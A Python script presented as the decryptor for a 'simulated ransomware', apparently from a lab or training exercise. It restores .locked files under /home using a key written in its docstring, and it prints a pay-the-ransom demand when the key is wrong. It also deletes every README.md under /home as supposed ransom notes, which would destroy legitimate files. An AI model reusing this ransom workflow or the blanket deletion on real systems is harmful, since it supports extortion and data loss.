#!/usr/bin/env python3
"""
extractor.py - Decryptor for the simulated ransomware.
Requires the correct key ("kami1234") to unlock .locked files.
"""

import os
import sys
import base64
import hashlib
from cryptography.fernet import Fernet

TARGET_DIRS = ["/home"]


def derive_key(secret: str) -> bytes:
    digest = hashlib.sha256(secret.encode()).digest()
    return base64.urlsafe_b64encode(digest)


def decrypt_file(path: str, fernet: Fernet) -> None:
    with open(path, "rb") as f:
        token = f.read()
    data = fernet.decrypt(token)
    out_path = path[:-len(".locked")]
    with open(out_path, "wb") as f:
        f.write(data)
    os.remove(path)


def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: extractor.py <KEY>")
        sys.exit(1)

    supplied = sys.argv[1]
    key = derive_key(supplied)
    fernet = Fernet(key)

    # sanity check — try to decrypt one file first
    sample = None
    for base in TARGET_DIRS:
        for root, _dirs, files in os.walk(base):
            for name in files:
                if name.endswith(".locked"):
                    sample = os.path.join(root, name)
                    break
            if sample:
                break
        if sample:
            break

    if sample is None:
        print("[!] No .locked files found. Nothing to do.")
        sys.exit(0)

    try:
        with open(sample, "rb") as f:
            fernet.decrypt(f.read())
    except Exception:
        print("[!] Invalid key. Pay the ransom to receive the correct key.")
        sys.exit(1)

    print("[+] Key accepted. Decrypting...")

    count = 0
    for base in TARGET_DIRS:
        for root, _dirs, files in os.walk(base):
            for name in files:
                if name.endswith(".locked"):
                    try:
                        decrypt_file(os.path.join(root, name), fernet)
                        print(f"[+] decrypted: {os.path.join(root, name)}")
                        count += 1
                    except Exception as e:
                        print(f"[!] failed {name}: {e}")

    # remove ransom notes
    for base in TARGET_DIRS:
        for root, _dirs, files in os.walk(base):
            if "README.md" in files:
                os.remove(os.path.join(root, "README.md"))

    print(f"\n[✓] Done. {count} files restored.")


if __name__ == "__main__":
    main()
